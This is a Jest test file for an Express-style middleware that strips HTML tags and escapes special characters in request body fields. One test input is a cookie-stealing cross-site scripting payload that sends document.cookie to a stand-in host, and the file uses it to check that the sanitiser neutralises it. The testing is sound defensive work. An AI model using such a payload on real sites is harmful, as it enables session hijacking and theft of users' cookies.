const sanitiseStrings = require('../../../src/middleware/sanitise-strings');

describe('middleware/sanitise-strings', () => {
  const req = {
    body: {
      inputOne: '<SCRIPT>var+img=new+Image();img.src="http://example/"%20+%20document.cookie;</SCRIPT>',
      inputTwo: ` < > & " ' `,
      inputThree: `<body><h1>Heading One</h1><p>Paragraph</p></body>`
    }
  };
  const next = jest.fn();

  const expected = {
    inputOne: 'var+img=new+Image();img.src=&quot;http://example/&quot;%20+%20document.cookie;',
    inputTwo: '&lt; &gt; &amp; &quot; &#39;',
    inputThree: `Heading One Paragraph`
  };

  sanitiseStrings('body', ['inputOne', 'inputTwo', 'inputThree'])(req, {}, next);

  test(`sanitise strings`, () => {
		expect(req.body.inputOne).toEqual(expected.inputOne);
    expect(req.body.inputTwo).toEqual(expected.inputTwo);
    expect(req.body.inputThree).toEqual(expected.inputThree);
	});
});
